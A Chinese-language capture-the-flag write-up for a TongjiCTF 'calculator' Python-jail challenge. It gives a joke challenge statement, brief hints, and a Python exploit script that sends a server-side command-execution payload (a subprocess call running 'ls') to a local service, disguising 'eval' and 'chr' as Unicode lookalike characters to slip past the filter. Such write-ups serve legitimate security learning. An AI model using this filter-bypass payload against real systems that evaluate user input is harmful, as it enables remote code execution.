# Tongji/同济 MH-12地摊神器摆摊计算器办公文具用品财务用银行用人事用会计学生商务送礼太阳能计算器

## 题面

by *Nemo*

TongjiCTF 组委会很自豪地在 [TongjiWIZ fx-991CN X](https://github.com/Cat-Training-Force/Tongji-CTF-2023/tree/main/Misc/%E5%A4%A9%E7%8B%97%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8) 之后给你带来他们的全新力作：Tongji/同济 MH-12地摊神器摆摊计算器办公文具用品财务用银行用人事用会计学生商务送礼太阳能计算器！我们保留了它的精髓，那就是：

归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零归零

## 思路

[PEP](https://peps.python.org/pep-0672/) [谷歌应该能查到的东西](https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/how-to-solve-a-pyjail.md) [Python Documentation](https://docs.python.org/3/howto/unicode.html)

所以你只要用 Unicode 去绕就完事了。

写一个 eval 的 payload，然后用 Unicode 替换掉 eval 就行了。

## Exploit

```python
import requests

def main():
    url = 'http://localhost:1338/'
    while True:
        expression = input('expression? > ')
        if expression == 'exit':
            break
        if expression == 'exp':
            base = '__import__("subprocess").check_output("ls", shell=True)'
            base_chr_int = [ord(i) for i in base]
            # expression = r'𝓮𝓿𝓪𝓵(𝕔𝕙𝕣(105) + 𝕔𝕙𝕣(109) + 𝕔𝕙𝕣(112) + 𝕔𝕙𝕣(111) + 𝕔𝕙𝕣(114) + 𝕔𝕙𝕣(116) + 𝕔𝕙𝕣(32) + 𝕔𝕙𝕣(111) + 𝕔𝕙𝕣(115));𝓰𝓮𝓽𝓪𝓽𝓽𝓻(𝐨𝐬, 𝕔𝕙𝕣(115) + 𝕔𝕙𝕣(121) + 𝕔𝕙𝕣(115) + 𝕔𝕙𝕣(116) + 𝕔𝕙𝕣(101) + 𝕔𝕙𝕣(109))(𝕔𝕙𝕣(108) + 𝕔𝕙𝕣(115))'
            expression = f'𝓮𝓿𝓪𝓵({"+".join([f"𝕔𝕙𝕣({i})" for i in base_chr_int])})'
        data = {'expression': expression}
        r = requests.post(url + 'calc', json=data)
        print(r.json()["result"])
        
if __name__ == '__main__':
    main()
```


